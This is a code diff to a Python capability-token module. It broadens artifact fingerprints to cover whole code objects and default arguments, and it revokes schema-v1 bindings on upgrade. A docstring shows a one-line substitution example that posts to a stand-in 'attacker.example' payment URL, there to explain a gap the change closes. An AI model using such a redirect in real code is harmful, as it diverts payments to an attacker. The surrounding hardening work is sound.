@@ -14,13 +14,29 @@ artifact it was first bound to, across restarts, and a re-registration under the
 same token is only accepted when it presents the same artifact.
 
 What a fingerprint covers and what it does not: it identifies the code object
-(module, qualified name, and a hash of its bytecode or its class's), the
-interpreter version it was compiled for, and -- for a closure -- the values it
-captured, so that two handlers built by the same factory with different
-arguments are not mistaken for each other. Captures whose value cannot be
-canonicalised deterministically (a live connection, an arbitrary object) are
-recorded as opaque and therefore do not distinguish those targets; that is a
-stated limit, exercised by a test, rather than a silent one.
+(module, qualified name, and a hash of the code it runs), the interpreter
+version it was compiled for, and -- for a function -- the values it captured and
+its default arguments, so that two handlers built by the same factory with
+different arguments are not mistaken for each other. Captures and defaults whose
+value cannot be canonicalised deterministically (a live connection, an arbitrary
+object) are recorded as opaque and therefore do not distinguish those targets;
+that is a stated limit, exercised by a test, rather than a silent one.
+
+"The code it runs" once meant `co_code` alone -- the instruction stream, and
+nothing else a code object holds. Instructions address their operands by index,
+so the constants, the global and attribute names, and the nested code objects
+are all reachable only through tables that were not hashed. Two functions of the
+same name whose only difference is which URL they post to, or which global they
+call, compile to byte-identical instructions:
+
+    def send(action): return post("https://bank.example/pay-supplier")
+    def send(action): return post("https://attacker.example/pay-me")
+
+Those were one artifact by this measure, which is the substitution the durable
+record exists to refuse. The digest now covers the whole code object -- code,
+consts (recursing into nested code), names, varnames, freevars, cellvars, the
+argument counts and the flags -- so an implementation differs from another
+whenever anything it would actually do differs.
 
 Class bytecode says nothing about what an instance holds, so two providers of
 the same class pointing at different endpoints were the same artifact by this
@@ -45,11 +61,22 @@ from datetime import UTC, datetime
 from pathlib import Path
 from secrets import token_urlsafe
 from threading import RLock
+from types import CodeType
 from typing import Any
 
 from .sqlite_support import SqliteLocation
 
-SCHEMA_VERSION = 1
+SCHEMA_VERSION = 2
+
+#: Why every capability written under schema v1 is revoked when the database is
+#: opened. A v1 row's fingerprint covered `co_code` alone, so it does not say
+#: which implementation the token stood for, and the artifact it was bound to is
+#: not available here to recompute it. Revoking is the only honest answer:
+#: re-binding those tokens would grant exactly the substitution v2 exists to
+#: refuse. Rotation issues new tokens, which is a supported operation.
+V1_FINGERPRINT_REVOCATION = (
+    "bound under schema v1, whose fingerprint covered bytecode alone; rotate to a new capability id"
+)
 
 #: Interpreter identity, so a capability bound under one runtime is not silently
 #: honoured under another whose bytecode means something different.
@@ -97,16 +124,98 @@ def _closure_identity(func: Any) -> list[Any]:
     return captured
 
 
-def _code_identity(target: Any) -> tuple[str, str, str, bytes, list[Any]]:
-    """(kind, module, qualname, code bytes, captured state) for a target."""
+def _const_identity(value: Any) -> Any:
+    """One entry of `co_consts`, canonicalised, recursing into nested code.
+
+    A comprehension, a lambda or a nested function is compiled into a code
+    object stored here; hashing its `repr` would identify it by memory address,
+    so it is hashed the same way its parent is. The types are the ones the
+    compiler can put in a constant table, listed explicitly: an entry of any
+    other type is refused rather than folded into an opaque bucket, because a
+    constant that cannot be told apart is the exact hole this function closes.
+    """
+    if isinstance(value, CodeType):
+        return {"code": _code_payload(value)}
+    if value is None:
+        return {"none": True}
+    if value is Ellipsis:
+        return {"ellipsis": True}
+    if isinstance(value, bool):
+        return {"bool": value}
+    if isinstance(value, int):
+        # str(), not the int itself: json would render 1 and True alike, and a
+        # very large int is exact here where a float is not.
+        return {"int": str(value)}
+    if isinstance(value, float):
+        # hex() is exact and distinguishes 0.0 from -0.0; repr rounds.
+        return {"float": value.hex()}
+    if isinstance(value, complex):
+        return {"complex": [value.real.hex(), value.imag.hex()]}
+    if isinstance(value, str):
+        return {"str": value}
+    if isinstance(value, bytes):
+        return {"bytes": value.hex()}
+    if isinstance(value, tuple):
+        return {"tuple": [_const_identity(item) for item in value]}
+    if isinstance(value, frozenset):
+        items = [_const_identity(item) for item in value]
+        return {"frozenset": sorted(items, key=lambda item: json.dumps(item, sort_keys=True, separators=(",", ":")))}
+    raise ValueError(f"a constant of type {type(value).__qualname__} cannot be fingerprinted")
+
+
+def _code_payload(code: CodeType) -> dict[str, Any]:
+    """Everything a code object holds that decides what running it does.
+
+    `co_code` is the instruction stream and its operands are indices into the
+    tables below, so hashing it alone identified the *shape* of a function and
+    not the function: same instructions, different constants, different names.
+    """
+    return {
+        "name": code.co_name,
+        "argcount": code.co_argcount,
+        "posonlyargcount": code.co_posonlyargcount,
+        "kwonlyargcount": code.co_kwonlyargcount,
+        "flags": code.co_flags,
+        "code": bytes(code.co_code).hex(),
+        "consts": [_const_identity(const) for const in code.co_consts],
+        "names": list(code.co_names),
+        "varnames": list(code.co_varnames),
+        "freevars": list(code.co_freevars),
+        "cellvars": list(code.co_cellvars),
+    }
+
+
+def _code_bytes(code: CodeType) -> bytes:
+    return json.dumps(_code_payload(code), sort_keys=True, separators=(",", ":")).encode("utf-8")
+
+
+def _function_state(func: Any) -> dict[str, Any]:
+    """What a function carries beside its code: captures and default arguments.
+
+    Defaults are evaluated once at definition and live on the function, not in
+    the code object, so `def send(action, url="https://bank.example")` and the
+    same line naming another host are one code object with two behaviours.
+    """
+    return {
+        "captured": _closure_identity(func),
+        "defaults": [_canonical_value(value) for value in (getattr(func, "__defaults__", None) or ())],
+        "kwdefaults": {
+            str(name): _canonical_value(value)
+            for name, value in sorted((getattr(func, "__kwdefaults__", None) or {}).items(), key=lambda pair: str(pair[0]))
+        },
+    }
+
+
+def _code_identity(target: Any) -> tuple[str, str, str, bytes, dict[str, Any]]:
+    """(kind, module, qualname, code identity bytes, function state) for a target."""
     code = getattr(target, "__code__", None)
     if code is not None:
         return ("callable", getattr(target, "__module__", "") or "", getattr(target, "__qualname__", "") or "",
-                bytes(code.co_code), _closure_identity(target))
+                _code_bytes(code), _function_state(target))
     func = getattr(target, "__func__", None)
     if func is not None and getattr(func, "__code__", None) is not None:
         return ("method", getattr(func, "__module__", "") or "", getattr(func, "__qualname__", "") or "",
-                bytes(func.__code__.co_code), _closure_identity(func))
+                _code_bytes(func.__code__), _function_state(func))
     kind = type(target)
     parts: list[bytes] = []
     for name in sorted(dir(kind)):
@@ -115,8 +224,8 @@ def _code_identity(target: Any) -> tuple[str, str, str, bytes, list[Any]]:
         member = getattr(kind, name, None)
         member_code = getattr(member, "__code__", None)
         if member_code is not None:
-            parts.append(name.encode("utf-8") + b"\x1f" + bytes(member_code.co_code))
-    return ("object", kind.__module__, kind.__qualname__, b"\x1e".join(parts), [])
+            parts.append(name.encode("utf-8") + b"\x1f" + _code_bytes(member_code))
+    return ("object", kind.__module__, kind.__qualname__, b"\x1e".join(parts), {})
 
 
 def _declared_identity(target: Any) -> Any:
@@ -145,14 +254,14 @@ def artifact_fingerprint(target: Any) -> str:
     """A stable identity for the code a capability token stands for."""
     if target is None:
         raise ValueError("an execution target is required")
-    kind, module, qualname, code, captured = _code_identity(target)
+    kind, module, qualname, code, state = _code_identity(target)
     payload = {
         "kind": kind,
         "module": module,
         "qualname": qualname,
         "runtime": RUNTIME_VERSION,
         "code": hashlib.sha256(code).hexdigest(),
-        "captured": captured,
+        "state": state,
     }
     declared = _declared_identity(target)
     if declared is not None:
@@ -174,6 +283,7 @@ class CapabilityRecord:
     status: str
     created_at: str
     revoked_at: str | None = None
+    revoked_reason: str | None = None
 
     @property
     def active(self) -> bool:
@@ -194,13 +304,9 @@ class DurableCapabilityStore:
     def _init_schema(self) -> None:
         with self._connect() as conn:
             conn.execute("CREATE TABLE IF NOT EXISTS execution_capability_schema (version INTEGER NOT NULL)")
-            row = conn.execute("SELECT version FROM execution_capability_schema").fetchone()
-            if row is None:
-                conn.execute("INSERT INTO execution_capability_schema(version) VALUES(?)", (SCHEMA_VERSION,))
-            elif int(row["version"]) != SCHEMA_VERSION:
-                raise RuntimeError(
-                    f"execution capability schema v{int(row['version'])} does not match v{SCHEMA_VERSION}; refusing to read it"
-                )
+            # Created before the version is read, so a v1 database has the table
+            # the migration below writes to; `IF NOT EXISTS` leaves an existing
+            # v1 table alone, which is why the migration adds its column itself.
             conn.execute(
                 """
                 CREATE TABLE IF NOT EXISTS execution_capabilities (
@@ -213,10 +319,46 @@ class DurableCapabilityStore:
                     epoch INTEGER NOT NULL,
                     status TEXT NOT NULL,
                     created_at TEXT NOT NULL,
-                    revoked_at TEXT
+                    revoked_at TEXT,
+                    revoked_reason TEXT
                 )
                 """
             )
+            row = conn.execute("SELECT version FROM execution_capability_schema").fetchone()
+            if row is None:
+                conn.execute("INSERT INTO execution_capability_schema(version) VALUES(?)", (SCHEMA_VERSION,))
+                return
+            version = int(row["version"])
+            if version == SCHEMA_VERSION:
+                return
+            if version == 1:
+                self._migrate_v1(conn)
+                return
+            raise RuntimeError(
+                f"execution capability schema v{version} does not match v{SCHEMA_VERSION}; refusing to read it"
+            )
+
+    @staticmethod
+    def _migrate_v1(conn: sqlite3.Connection) -> None:
+        """Retire every v1 binding instead of carrying its fingerprint forward.
+
+        A v1 fingerprint covered `co_code` alone, so the row does not say which
+        implementation the token stood for, and recomputing it is impossible
+        from here: the artifact lives in a process, not in this database. Left
+        as ACTIVE, each row would go on authorizing any implementation that
+        shares its instruction stream. Deleted, each token would re-bind to
+        whatever object is presented first after the upgrade -- the restart
+        bypass, granted once to whoever runs it. Revoked, they refuse, and say
+        why: rotation to a new token is the supported way forward.
+        """
+        columns = {str(row["name"]) for row in conn.execute("PRAGMA table_info(execution_capabilities)")}
+        if "revoked_reason" not in columns:
+            conn.execute("ALTER TABLE execution_capabilities ADD COLUMN revoked_reason TEXT")
+        conn.execute(
+            "UPDATE execution_capabilities SET status='REVOKED', revoked_at=?, revoked_reason=? WHERE status='ACTIVE'",
+            (datetime.now(UTC).isoformat(), V1_FINGERPRINT_REVOCATION),
+        )
+        conn.execute("UPDATE execution_capability_schema SET version=?", (SCHEMA_VERSION,))
 
     def get(self, capability_id: str) -> CapabilityRecord | None:
         with self._connect() as conn:
@@ -238,7 +380,8 @@ class DurableCapabilityStore:
             if row is not None:
                 record = self._record(row)
                 if record.status == "REVOKED":
-                    raise PermissionError("a revoked capability id cannot be re-registered")
+                    reason = f" ({record.revoked_reason})" if record.revoked_reason else ""
+                    raise PermissionError(f"a revoked capability id cannot be re-registered{reason}")
                 if record.artifact_fingerprint != fingerprint:
                     raise PermissionError("capability id is already bound to a different executable artifact")
                 if record.runtime_version != RUNTIME_VERSION:
@@ -280,6 +423,7 @@ class DurableCapabilityStore:
         return CapabilityRecord(
             row["capability_id"], row["artifact_fingerprint"], row["artifact_kind"], row["module"], row["qualname"],
             row["runtime_version"], int(row["epoch"]), row["status"], row["created_at"], row["revoked_at"],
+            row["revoked_reason"],
         )
 
 
@@ -375,6 +519,7 @@ __all__ = [
     "GLOBAL_EXECUTION_CAPABILITIES",
     "RUNTIME_VERSION",
     "SCHEMA_VERSION",
+    "V1_FINGERPRINT_REVOCATION",
     "CapabilityRecord",
     "DurableCapabilityStore",
     "ExecutionCapabilityRegistry",
